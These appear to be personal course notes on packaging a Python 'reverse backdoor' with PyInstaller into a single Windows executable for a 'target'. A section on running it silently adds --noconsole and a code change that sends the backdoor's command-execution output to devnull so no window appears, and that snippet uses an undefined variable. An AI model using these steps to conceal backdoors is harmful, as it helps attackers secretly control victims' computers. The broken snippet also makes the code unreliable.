Packaging

    - Convert python program into an executable that:
        - Packages all program files into a single executable
        - Works without a python interpreter
        - Get executed when double-clicked 
    
    - For best results package the program from the same OS as the target.
        - EG if target is Windows then package the program from a Windows computer with a python interpreter.
    

    1- locate python.exe on your machine
        on this machine its at : C:\Users\MasterJedi\AppData\Local\Programs\Python\Python313

    2- install pyinterpreter
        python.exe -m pip install pyinstaller

        - This will install pyinstaller in the /Script folder as pyinstaller.
            This is the executable that we'll use in order to convert our own Python Programs
            into .exe 
    
    3- to convert a .py file to an executable
        using file explorer travel to the location of the .py file you want to transform to a .exe
        use the path to the pyinstaller followed by the file name.
            C:\Users\MasterJedi\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe reverse_backdoor.py --onefile
            the --onefile tells pyinstaller to package everything into a single file.

    Running Executables Silentely

        To run the program without having a console appear you more argument must be added 
        which is --noconsole

        C:\Users\MasterJedi\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole

        We also have to find a way to deal with the stderr and stdout
            This is because we use the function check_output else we would not need to.
            This is where we had to modify our code:
            def execute_system_command(self, command):
                DEVNULL = open(os.devnull, 'wb')
                result = subprocess.check_output(full_cmd, stderr=DEVNULL, stdin=DEVNULL, shell=True)
        
        then recompile the file 
            C:\Users\MasterJedi\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole
